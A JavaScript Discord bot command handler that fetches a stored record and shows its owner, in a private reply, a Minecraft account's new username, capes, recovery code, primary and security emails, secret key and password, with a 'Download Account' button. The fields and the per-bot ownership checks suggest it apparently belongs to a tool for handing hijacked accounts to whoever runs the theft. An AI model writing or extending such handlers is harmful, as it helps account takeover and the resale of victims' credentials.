const { queryParams } = require("../../../db/database");
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");

const isOwner = require("../../../db/isOwner");

module.exports = {
    name: "copyText",
    callback: async (client, interaction) => {
        try {
            let [, copyTextId] = interaction.customId.split("|");
            const results = await client.queryParams("SELECT action FROM actions WHERE id = ?", [copyTextId]);

            if (!results || results.length === 0) {
                return interaction.reply({
                    content: `No action found for ID: ${copyTextId}`,
                    ephemeral: true,
                });
            }

            const parts = results[0].action.split("|");
            let ownerId, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password;

            if (parts.length >= 10) {
                [, ownerId, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password] = parts;
                const isUserOwner = await isOwner(interaction.user.id);
                if (ownerId && interaction.user.id !== ownerId && !isUserOwner) {
                    return interaction.reply({
                        content: "You are not authorized to view these credentials.",
                        ephemeral: true,
                    });
                }
            } else {
                [, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password] = parts;
                const isUserOwner = await isOwner(interaction.user.id);
                const isChildBotOwner = client.username && client.username === interaction.user.id;
                if (!isUserOwner && !isChildBotOwner) {
                    return interaction.reply({
                        content: "You are not authorized to view these credentials.",
                        ephemeral: true,
                    });
                }
            }


            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId(`downloadacc|${copyTextId}`)
                    .setLabel('Download Account')
                    .setStyle(ButtonStyle.Secondary) // The style is now an enum, `ButtonStyle.Secondary`
            );

            return interaction.reply({
                content: `Username: ${newName}\nOwns MC: ${mc}\nCapes: ${capes}\nRecovery Code: ${recoveryCode}\nPrimary Email: ${email}\nSecurity Email: ${secEmail}\nSecret Key: ${secretkey}\nPassword: ${password}`,
                components: [row],
                ephemeral: true,
            });
        } catch (error) {
            console.error("Error processing copy text:", error);
            return interaction.reply({
                content: "An error occurred while retrieving the action details.",
                ephemeral: true,
            });
        }
    },
};
